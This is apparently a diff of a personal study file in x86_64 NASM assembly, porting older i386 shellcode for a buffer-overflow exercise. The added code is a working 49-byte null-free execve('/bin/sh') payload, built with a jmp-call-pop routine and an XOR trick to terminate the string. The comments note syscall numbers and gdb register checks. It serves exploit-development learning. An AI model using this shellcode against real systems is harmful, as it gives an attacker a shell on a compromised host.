@@ -1,11 +1,21 @@
 
 ; This is for bof.c
 ; It is the x86_64 version of testya5.asm from the i386 notes
-; It is modeled after un1k0d3r's code in the paper.
-; This shell code is ?? bytes in length
+; It is in nasm64 assembly.  It has been tweaked to use some methods
+; from un1k0d3r's code in the paper.  However, it gets a shell
+; instead of read/write /etc/passwd to stdout.
+; This shell code is 49 bytes in length
 ; John F. Davis davisjf@gmail.com
 
+; vim/syntastic notes
+; This is annoying, but everytime I write the file in vim, I need to do
+; :SyntasticCheck nasm64
+; This only needs to be done once, but it sets syntax high lighting correctly
+; :set filetype=nasm
 
+
+; From man page on syscall
+;
 ;  arch/ABI   instruction          syscall #   retval Notes
 ;  ───────────────────────────────────────────────────────────────────
 ;  x86_64     syscall              rax         rax    See below
@@ -17,53 +27,55 @@
 ;
 
 
-;;;;;; Above this line is part of our model for how we get to our
-;;;;;; function pointer to call based upon ascii variable decoded in read buffer.
-; create a label so we know where to start looking when
-; we write the patch file.
 	jmp theCall
 
 ; Release the kracken
 theKracken:
-	pop rdi
+	pop rdi		; ARG1, rdi is a pointer to string
 
-; This is our goal - TODO: adjust for x86_64
-; (gdb) print /x $eax
-; $3 = 0xb                       system call number
-; (gdb) print /x $ebx
-; $4 = 0xbffff374                pointer to string
-; (gdb) print /x $ecx
+; this is our goal.
+;
+; (gdb) print /x $rax
+; $3 = 0x3b                       system call number - execv 59 or 0x3B
+; (gdb) print /x $rdi
+; $4 =  0x7fffffffde92 
+; (gdb) print /x $rsi
 ; $5 = 0xbffff37c                pointer to pointer to string
-; (gdb) print /x $edx
+; (gdb) print /x $rdx
 ; $6 = 0x0						 null pointer
 ; (gdb) x/4w 0xbffff374
 ; 0xbffff374:     0x6e69622f      0x0068732f      0xbffff374      0x00000000
 
 
-; TODO: just changed reg names around.  need to use x86_64 ABI
-
 ; Prepare execv parms in the regs per abi
 ; Load the string pointers for parm 1 and 2
-	mov rbx, rsp  ; ebx is a pointer to string
-	add rsp, 8		; point to next word
-	mov [esp], rbx	; put pointer in the word
-	mov rcx, rsp  ; ecx is a pointer to a pointer to string
-; Add code to create null pointer for exec syscall
-	mov    rax, rcx ; edx will point to next location
-	add    rax, 4
-	xor    rdx, rdx
-	mov    [eax], rdx ; now edx points to a zero word
+; nasm assembly uses Intel style for mov's where its dst, src
+;
+	xor byte [rdi+7], 0x41	; write zero to offset 7 byte to null term the string
+; function args
+; rdi is already set
+	lea rax, [rdi]
+	mov [rdi+8], rax 		; write address to memory.
+	mov rsi, rdi			; 
+	add rsi, 0x8			; ARG2, rsi now is a pointer to pointer to string.
+; set nulls
+	xor rdx, rdx			; ARG3, rdx is null 
+	mov [rdi+16], rdx 	    ; write null to word following pointer to pointer
+
+
 ; Load the execv system call
 	xor rax, rax ; eax is zero again
-	mov rdx, rax
-	add rax, 0xb ; now its the execv syscall
+	add rax, 0x3b ; now its the execv syscall
 ; Do a system call
-	int 0x80
+	syscall 
 	
 
 
 theCall:
 	call theKracken
 
-execvCmdString: db '/bin/sh',0x0
+; use unlcoders technique for doing null term string.  Rather than writing a zero
+; he stores a 'A' and then xors it to zero.
+execvCmdString: db '/bin/sh',0x41
+
 
